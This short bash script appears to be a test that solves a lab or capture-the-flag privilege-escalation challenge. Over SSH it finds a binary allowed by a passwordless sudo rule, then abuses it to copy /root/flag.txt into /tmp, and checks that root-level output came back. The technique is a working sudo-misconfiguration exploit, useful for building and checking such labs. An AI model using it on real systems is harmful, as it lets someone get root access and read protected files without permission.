#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); rm -f /tmp/csp*; sudo -n "$BIN" -s -f /tmp/csp /root/flag.txt 1; cat /tmp/csp*')"
assert_root_output "${out}"
